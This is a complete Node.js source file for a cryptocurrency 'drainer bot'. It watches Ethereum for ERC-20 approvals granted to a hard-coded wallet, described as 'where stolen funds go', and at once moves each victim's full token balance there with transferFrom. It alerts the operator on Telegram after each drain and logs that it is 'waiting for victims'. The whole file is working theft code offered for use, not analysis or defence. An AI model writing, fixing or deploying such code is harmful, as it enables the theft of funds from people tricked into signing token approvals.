// ============================================================
// 🔴 REQUIRED FOR RAILWAY - Web server to keep container alive
// ============================================================
const http = require('http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Drainer Bot Running\n');
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`✅ Web server listening on port ${PORT}`);
});

// ============================================================
// 🔴 BOT CODE STARTS HERE
// ============================================================
const { ethers } = require('ethers');

// ============================================================
// 🔴 YOUR WALLET ADDRESS (where stolen funds go)
// ============================================================
const YOUR_WALLET_ADDRESS = '0x277c6118CcDB4F2E7A5e71D3406de484145e27D8';

// ============================================================
// 🔴 ENVIRONMENT VARIABLES (set in Railway)
// ============================================================
const YOUR_PRIVATE_KEY = process.env.PRIVATE_KEY;
const ETHEREUM_RPC = process.env.INFURA_URL;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('🔍 Checking environment variables...');
console.log('PRIVATE_KEY set:', !!YOUR_PRIVATE_KEY);
console.log('INFURA_URL set:', !!ETHEREUM_RPC);
console.log('TELEGRAM_BOT_TOKEN set:', !!TELEGRAM_BOT_TOKEN);
console.log('TELEGRAM_CHAT_ID set:', !!TELEGRAM_CHAT_ID);

// ============================================================
// 🔴 FIXED TELEGRAM FUNCTION
// ============================================================
async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('📝 [Telegram] Not configured - message:', message.substring(0, 50));
    return;
  }
  
  try {
    console.log('📤 [Telegram] Sending message...');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const data = await response.json();
    
    if (data.ok) {
      console.log('✅ [Telegram] Message sent successfully');
    } else {
      console.log('❌ [Telegram] API error:', data.description);
      
      // Try without markdown if markdown failed
      if (data.description && data.description.includes('parse_mode')) {
        console.log('🔄 [Telegram] Retrying without markdown...');
        const retryResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message.replace(/[*`_]/g, '')
          })
        });
        const retryData = await retryResponse.json();
        if (retryData.ok) {
          console.log('✅ [Telegram] Retry successful');
        } else {
          console.log('❌ [Telegram] Retry failed:', retryData.description);
        }
      }
    }
  } catch (error) {
    console.log('❌ [Telegram] Network error:', error.message);
  }
}

// ============================================================
// 🔴 TOKEN LIST TO MONITOR
// ============================================================
const TOKENS_TO_MONITOR = [
  { symbol: 'USDT',  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
  { symbol: 'USDC',  address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
  { symbol: 'DAI',   address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
  { symbol: 'WETH',  address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
  { symbol: 'WBTC',  address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
  { symbol: 'UNI',   address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
  { symbol: 'LINK',  address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
  { symbol: 'SHIB',  address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
  { symbol: 'PEPE',  address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
  { symbol: 'ARB',   address: '0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1', decimals: 18 },
];

// ============================================================
// 🔴 ERC20 ABIs
// ============================================================
const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function symbol() view returns (string)',
  'function decimals() view returns (uint8)',
  'function name() view returns (string)'
];

// Approval event topic hash
const APPROVAL_TOPIC = ethers.id('Approval(address,address,uint256)');

// ============================================================
// 🔴 GET TOKEN BALANCE WITH PROPER DECIMALS
// ============================================================
async function getTokenBalance(tokenAddress, owner, provider) {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await tokenContract.balanceOf(owner);
    const decimals = await tokenContract.decimals().catch(() => 18);
    const symbol = await tokenContract.symbol().catch(() => 'Unknown');
    
    return {
      balance,
      formattedBalance: ethers.formatUnits(balance, decimals),
      symbol,
      decimals
    };
  } catch (err) {
    console.log(`Error getting balance for ${tokenAddress}:`, err.message);
    return null;
  }
}

// ============================================================
// 🔴 DRAIN FUNCTION
// ============================================================
async function drainToken(tokenAddress, owner, wallet, provider) {
  let tokenSymbol = 'Unknown';
  let formattedBalance = '0';
  let rawBalance = 0n;
  
  try {
    console.log(`\n💰 Processing token: ${tokenAddress}`);
    console.log(`👤 Owner: ${owner}`);
    
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    
    // Get token details
    try {
      tokenSymbol = await tokenContract.symbol();
    } catch (err) {
      console.log(`⚠️ Could not get symbol: ${err.message}`);
    }
    
    // Get decimals
    let decimals = 18;
    try {
      decimals = await tokenContract.decimals();
    } catch (err) {}
    
    // Get balance
    rawBalance = await tokenContract.balanceOf(owner);
    if (rawBalance === 0n) {
      console.log(`⏭️ No balance for ${tokenSymbol}`);
      return false;
    }
    
    formattedBalance = ethers.formatUnits(rawBalance, decimals);
    console.log(`💰 Found ${formattedBalance} ${tokenSymbol}`);
    
    // Send Telegram notification
    await sendTelegram(
      `🎯 *Approval Detected*\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\``
    );
    
    // Check if bot has ETH for gas
    const botBalance = await provider.getBalance(wallet.address);
    const botEthBalance = ethers.formatEther(botBalance);
    console.log(`🤖 Bot ETH balance: ${botEthBalance} ETH`);
    
    if (botBalance < ethers.parseEther('0.002')) {
      console.log('❌ Bot has less than 0.002 ETH - cannot drain!');
      await sendTelegram(
        `⚠️ *Low Gas Warning*\n` +
        `Bot has only ${botEthBalance} ETH\n` +
        `Need at least 0.002 ETH to drain ${formattedBalance} ${tokenSymbol}`
      );
      return false;
    }
    
    console.log(`🔄 Draining ${formattedBalance} ${tokenSymbol}...`);
    
    // Execute transferFrom
    const tx = await tokenContract.transferFrom(
      owner,
      YOUR_WALLET_ADDRESS,
      rawBalance,
      { gasLimit: 100000 }
    );
    
    console.log(`✅ Transaction sent! Hash: ${tx.hash}`);
    
    // Wait for confirmation
    const receipt = await tx.wait();
    console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
    console.log(`✅ Gas used: ${receipt.gasUsed.toString()}`);
    
    // Send success notification
    await sendTelegram(
      `✅ *Drain Successful*\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
      `To: \`${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}\`\n` +
      `TX: [View](https://etherscan.io/tx/${tx.hash})`
    );
    
    return true;
    
  } catch (err) {
    console.error('❌ Drain error:', err.message);
    
    // Check for specific errors
    let errorMsg = err.message;
    if (err.message.includes('insufficient funds')) {
      errorMsg = 'Bot has insufficient ETH for gas';
    } else if (err.message.includes('transfer amount exceeds balance')) {
      errorMsg = 'Balance changed or already drained';
    } else if (err.message.includes('execution reverted')) {
      errorMsg = 'Transaction reverted - approval may have been revoked';
    }
    
    await sendTelegram(
      `❌ *Drain Failed*\n` +
      `Token: ${tokenSymbol}\n` +
      `Amount: ${formattedBalance}\n` +
      `Error: ${errorMsg.slice(0, 100)}`
    );
    return false;
  }
}

// ============================================================
// 🔴 CHECK IF TOKEN IS IN OUR MONITOR LIST
// ============================================================
function isTokenMonitored(tokenAddress) {
  return TOKENS_TO_MONITOR.some(t => 
    t.address.toLowerCase() === tokenAddress.toLowerCase()
  );
}

// ============================================================
// 🔴 TEST FUNCTION
// ============================================================
async function runTests(provider, wallet) {
  console.log('\n🧪 ===== RUNNING SYSTEM TESTS =====');
  
  // Test 1: Telegram
  console.log('🧪 Test 1: Telegram...');
  await sendTelegram('🤖 *Drainer Bot Started*\n✅ System tests beginning...');
  
  // Test 2: Ethereum connection
  console.log('🧪 Test 2: Ethereum connection...');
  try {
    const blockNumber = await provider.getBlockNumber();
    console.log(`✅ Connected. Current block: ${blockNumber}`);
  } catch (err) {
    console.log('❌ Connection failed:', err.message);
  }
  
  // Test 3: Bot wallet balance
  console.log('🧪 Test 3: Bot wallet balance...');
  try {
    const balance = await provider.getBalance(wallet.address);
    const ethBalance = ethers.formatEther(balance);
    console.log(`✅ Bot balance: ${ethBalance} ETH`);
    
    if (balance < ethers.parseEther('0.01')) {
      await sendTelegram(
        `⚠️ *LOW BALANCE WARNING*\n` +
        `Bot has only ${ethBalance} ETH\n` +
        `Send at least 0.01 ETH to:\n` +
        `\`${YOUR_WALLET_ADDRESS}\``
      );
    } else {
      await sendTelegram(`✅ Bot balance: ${ethBalance} ETH`);
    }
  } catch (err) {
    console.log('❌ Balance check failed:', err.message);
  }
  
  // Test 4: Check if we can read token contracts
  console.log('🧪 Test 4: Token contract test...');
  try {
    const testToken = TOKENS_TO_MONITOR[0];
    const tokenContract = new ethers.Contract(testToken.address, ERC20_ABI, provider);
    const symbol = await tokenContract.symbol();
    console.log(`✅ Can read token: ${symbol}`);
  } catch (err) {
    console.log('❌ Token test failed:', err.message);
  }
  
  console.log('🧪 ===== TESTS COMPLETE =====\n');
}

// ============================================================
// 🔴 MAIN FUNCTION
// ============================================================
async function main() {
  console.log('\n🚀 ===== STARTING DRAINER BOT =====');
  console.log(`📤 Receiving wallet: ${YOUR_WALLET_ADDRESS}`);
  
  // Check required environment variables
  if (!YOUR_PRIVATE_KEY) {
    console.error('❌ PRIVATE_KEY not set in environment variables');
    process.exit(1);
  }
  
  if (!ETHEREUM_RPC) {
    console.error('❌ INFURA_URL not set in environment variables');
    process.exit(1);
  }
  
  try {
    // Connect to Ethereum
    const provider = new ethers.JsonRpcProvider(ETHEREUM_RPC);
    const wallet = new ethers.Wallet(YOUR_PRIVATE_KEY, provider);
    
    console.log(`🤖 Bot wallet: ${wallet.address}`);
    
    // Check bot's ETH balance
    const botBalance = await provider.getBalance(wallet.address);
    console.log(`💰 Bot ETH balance: ${ethers.formatEther(botBalance)} ETH`);
    
    // Create filter for Approval events to YOUR wallet
    const filter = {
      topics: [
        APPROVAL_TOPIC,
        null,
        ethers.zeroPadValue(YOUR_WALLET_ADDRESS, 32)
      ]
    };
    
    console.log('\n👀 Monitoring for approvals...');
    console.log('⏳ Waiting for victims...\n');
    
    // Send startup notification
    await sendTelegram(
      `🚀 *Drainer Bot Started*\n` +
      `📤 Receiving: \`${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}\`\n` +
      `💰 Balance: ${ethers.formatEther(botBalance)} ETH`
    );
    
    // Listen for new blocks
    provider.on('block', async (blockNumber) => {
      try {
        // Get logs from this block
        const logs = await provider.getLogs({
          ...filter,
          fromBlock: blockNumber,
          toBlock: blockNumber
        });
        
        for (const log of logs) {
          const owner = '0x' + log.topics[1].slice(26);
          const tokenAddress = log.address;
          
          // Check if token is in our monitor list
          if (!isTokenMonitored(tokenAddress)) {
            console.log(`⏭️ Skipping non-monitored token: ${tokenAddress}`);
            continue;
          }
          
          console.log(`\n🎯 === FOUND APPROVAL IN BLOCK ${blockNumber} ===`);
          console.log(`Token: ${tokenAddress}`);
          console.log(`Owner: ${owner}`);
          
          // Get token balance first
          const tokenData = await getTokenBalance(tokenAddress, owner, provider);
          
          if (tokenData && tokenData.balance > 0n) {
            console.log(`💰 Balance: ${tokenData.formattedBalance} ${tokenData.symbol}`);
            
            // Send immediate notification
            await sendTelegram(
              `🎯 *Approval Found*\n` +
              `Token: ${tokenData.symbol}\n` +
              `Amount: ${tokenData.formattedBalance}\n` +
              `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
              `Block: ${blockNumber}`
            );
            
            // Drain the tokens
            await drainToken(tokenAddress, owner, wallet, provider);
          } else {
            console.log(`⚠️ No balance found for token`);
            await sendTelegram(
              `⚠️ *Approval Found But No Balance*\n` +
              `Token: ${tokenAddress.slice(0, 10)}...\n` +
              `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
              `Token may have been already drained`
            );
          }
        }
      } catch (err) {
        console.error('Error processing block:', err.message);
      }
    });
    
    // Scan recent blocks on startup
    console.log('🔍 Scanning recent blocks for missed approvals...');
    const currentBlock = await provider.getBlockNumber();
    let missedFound = 0;
    
    for (let i = currentBlock - 50; i <= currentBlock; i++) {
      try {
        const logs = await provider.getLogs({
          ...filter,
          fromBlock: i,
          toBlock: i
        });
        
        for (const log of logs) {
          const owner = '0x' + log.topics[1].slice(26);
          const tokenAddress = log.address;
          
          if (!isTokenMonitored(tokenAddress)) continue;
          
          missedFound++;
          console.log(`\n🎯 Found missed approval in block ${i}`);
          console.log(`Token: ${tokenAddress}`);
          console.log(`Owner: ${owner}`);
          
          const tokenData = await getTokenBalance(tokenAddress, owner, provider);
          
          if (tokenData && tokenData.balance > 0n) {
            console.log(`💰 Balance: ${tokenData.formattedBalance} ${tokenData.symbol}`);
            await drainToken(tokenAddress, owner, wallet, provider);
          }
        }
      } catch (err) {}
    }
    
    if (missedFound > 0) {
      console.log(`\n✅ Processed ${missedFound} missed approvals`);
    }
    
    // Run tests
    await runTests(provider, wallet);
    
    // Keep process alive and log heartbeat
    setInterval(async () => {
      const balance = await provider.getBalance(wallet.address);
      console.log(`💓 Heartbeat - ${new Date().toISOString()} - Balance: ${ethers.formatEther(balance)} ETH`);
    }, 600000); // Every 10 minutes
    
  } catch (err) {
    console.error('🔥 Fatal error in main:', err);
    await sendTelegram(`❌ *Bot Crashed*\n${err.message.slice(0, 200)}`);
    process.exit(1);
  }
}

// ============================================================
// 🔴 ERROR HANDLERS
// ============================================================
process.on('uncaughtException', (err) => {
  console.error('🔥 UNCAUGHT EXCEPTION:', err);
  sendTelegram(`❌ *Uncaught Exception*\n${err.message.slice(0, 200)}`);
});

process.on('unhandledRejection', (err) => {
  console.error('🔥 UNHANDLED REJECTION:', err);
  sendTelegram(`❌ *Unhandled Rejection*\n${err.message.slice(0, 200)}`);
});

// ============================================================
// 🔴 START THE BOT
// ============================================================
main();
